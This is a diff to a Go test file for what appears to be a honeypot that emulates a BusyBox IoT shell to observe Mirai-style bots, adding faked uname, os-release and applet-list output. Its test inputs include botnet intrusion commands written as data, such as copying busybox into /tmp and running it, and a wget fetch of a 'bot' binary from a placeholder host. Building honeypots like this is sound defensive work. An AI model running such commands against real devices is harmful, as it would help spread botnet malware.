@@ -37,8 +37,12 @@ func TestRun(t *testing.T) {
 		{"cat /tmp", "cat: read error: Is a directory\n"},
 		{"./bot", "-sh: ./bot: not found\n"},
 		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
-		{"ls /etc", "hostname     hosts        passwd       resolv.conf  shadow\n"}, // columns as wide as the longest name + 2
-		{"cat /bin/echo", elfHeader},                                                // a link to busybox: Mirai reads the ELF header through it
+		{"ls /etc", "hostname     issue.net    passwd       resolv.conf\n" + // columns as wide as the longest name + 2,
+			"hosts        os-release   profile      shadow\n"}, // filled top to bottom
+		{"uname -a", "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n"},
+		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
+		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
+		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
 		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
 		{"cd /bin; ./ls /var", "log  run  tmp\n"},
 		{"/sbin/init", "init: must be run as PID 1\n"},
@@ -188,6 +192,22 @@ func TestPsMatchesFiles(t *testing.T) {
 				t.Errorf("ps shows %s, which does not exist", f)
 			}
 		}
+	}
+}
+
+// "busybox" alone: BusyBox 1.30.1's own text, then the applets wrapped like appletlib.c does
+// (a new line when col >= 79 - (len + 2); the tab counts as 6).
+func TestBusyboxHelp(t *testing.T) {
+	out, _ := NewShell().Run("busybox")
+	if !strings.HasPrefix(out, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n") {
+		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
+	}
+	want := "Currently defined functions:\n" +
+		"\tash, cat, chmod, cp, echo, false, ftpget, grep, hostname, id, init,\n" +
+		"\tkill, killall, klogd, login, ls, mkdir, mv, ps, pwd, rm, sh, sleep,\n" +
+		"\tsyslogd, telnetd, tftp, touch, true, uname, wget, whoami\n"
+	if !strings.HasSuffix(out, want) {
+		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
 	}
 }
 
